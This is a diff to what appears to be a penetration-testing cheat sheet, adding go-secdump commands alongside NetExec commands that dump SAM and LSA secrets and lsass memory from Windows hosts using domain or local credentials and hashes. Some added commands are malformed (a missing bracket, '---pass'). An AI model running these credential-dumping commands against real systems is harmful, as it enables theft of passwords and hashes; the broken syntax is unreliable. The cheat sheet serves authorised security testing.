@@ -506,31 +506,51 @@ grep -i <keyword> *
   NetExec ldap <target_IP> -u <username> -p <password> -H <hash[LM:NT]> -M masky -o CA=<'ADCS_server_name'>
   ```
   
-  ### Dump SAM with domain user
+  ### NetExec Dump SAM with domain user
   ```shell
   NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]]> --sam
   ```
+
+  ### go-secdump Dump SAM with domain user
+  ```shell
+  ./go-secdump --domain <Domain_Controller_IP --host <target_IP> --user <username> ---pass <password> --hash <hash[LM:NT]]> --sam
+  ```
   
-   ### Dump LSA with domain user
+  ### NetExec Dump LSA with domain user
   ```shell
   NetExec smb <target_IP> -u <username> -p <password> -H <hash_NT]> --lsa
   ```
+   ### go-secdump Dump LSA with domain user
+  ```shell
+  ./go-secdump --domain <Domain_Controller_IP --host <target_IP> --user <username> ---pass <password> --hash <hash[LM:NT]]> --lsa
+  ```
+
 </details> 
 
 <details>
   <summary> Local authentication </summary> 
   
-  ### Dump SAM on local computer
+  ### NetExec Dump SAM on local computer
   ```shell
   NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> --local-auth --sam
   ```
+
+  ### sec-dump Dump SAM on local computer
+  ```shell
+  ./go-secdump --domain <Domain_Controller_IP --host <target_IP> --user <username> ---pass <password> --hash <hash[LM:NT]]> --sam --local
+  ```
   
-  ### Dump LSA on local computer
+  ### NetExec Dump LSA on local computer
   ```shell
   NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> --local-auth --lsa
   ```
 
-  ### Dump lsass with hash_spider to recursively using BloodHound to find local admins path (adminTo)
+  ### go-secdump Dump LSA on local computer
+  ```shell
+  ./go-secdump --domain <Domain_Controller_IP --host <target_IP> --user <username> ---pass <password> --hash <hash[LM:NT]]> --lsa --local
+  ```
+
+  ### NetExec  Dump lsass with hash_spider to recursively using BloodHound to find local admins path (adminTo)
   ```shell
   NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> --local-auth -M hash_spider
   ```
